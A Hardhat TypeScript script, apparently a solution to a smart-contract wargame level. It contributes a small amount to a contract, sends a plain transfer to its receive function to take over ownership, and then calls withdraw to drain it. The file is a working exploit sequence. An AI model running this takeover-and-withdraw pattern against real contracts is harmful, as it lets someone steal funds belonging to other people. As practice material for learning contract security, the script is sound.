import { ethers } from "hardhat"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const contractAddress = "0x97C84E26E4f0E850567Aab85980911c11B8324Ba"
  const abi = [
    {
      inputs: [],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [],
      name: "contribute",
      outputs: [],
      stateMutability: "payable",
      type: "function",
      payable: true,
      signature: "0xd7bb99ba",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      name: "contributions",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x42e94c90",
    },
    {
      inputs: [],
      name: "getContribution",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xf10fdf5c",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address payable",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
    {
      inputs: [],
      name: "withdraw",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0x3ccfd60b",
    },
    {
      stateMutability: "payable",
      type: "receive",
      payable: true,
    },
  ]
  const contract = await ethers.getContractAt(abi, contractAddress)
  const tx = await contract.contribute({
    value: ethers.utils.parseEther("0.0001"),
  })
  const receipt = await tx.wait()
  console.log(`tx at ${receipt}`)

  const result = await contract.getContribution()
  console.log(`tx at ${ethers.utils.formatEther(result)} ETH`)

  await deployer.sendTransaction({
    to: contractAddress,
    value: ethers.utils.parseEther("0.000000001"),
  })

  console.log(`who is owner ${await contract.owner()}`)

  await contract.withdraw()
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
